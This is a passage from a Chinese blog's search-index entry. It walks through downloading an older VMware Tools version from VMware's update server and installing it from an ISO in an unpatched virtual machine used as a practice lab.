      <url>/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/</url>
      
        <content type="html"><![CDATA[<ul><li>很多时候我们需要安装未打补丁的系统来作为练习靶场，而为未打补丁的系统是无法直接安装新版本的vmtools的</li></ul><p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(6).png" alt></p><ul><li>但是我们可以手动安装旧版本的vmtools</li><li>在这个网址我们可以下载历史版本的vmtools，<a href="http://softwareupdate.vmware.com/cds/vmw-desktop/ws/" target="_blank" rel="noopener">http://softwareupdate.vmware.com/cds/vmw-desktop/ws/</a></li><li>比如我们需要下载14.1.8版本的vmtools</li><li>我们就可以打开网址选择14.1.8</li></ul><p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(2).png" alt></p><ul><li>最后进入到目录/14921873/windows/packages/中</li></ul><p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(7).png" alt></p><ul><li>下载完后需要解压出里面的iso文件</li></ul><p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(5).png" alt></p><ul><li>接着在需要安装vmtools的系统中添加一个新的CD驱动器</li></ul><p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(4).png" alt></p><ul><li>添加完新的CD驱动后，给驱动选择下载好的vmtools.iso</li></ul><p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(3).png" alt></p><ul><li>添加完后，就可以弹出安装程序了</li></ul><p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard(1).png" alt></p><ul><li>最后就是正常的安装流程了</li></ul><p><img src="/2019/06/23/VMware%E5%AE%89%E8%A3%85%E6%97%A7%E7%89%88%E6%9C%ACvmtools/clipboard.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 工具使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VMware </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
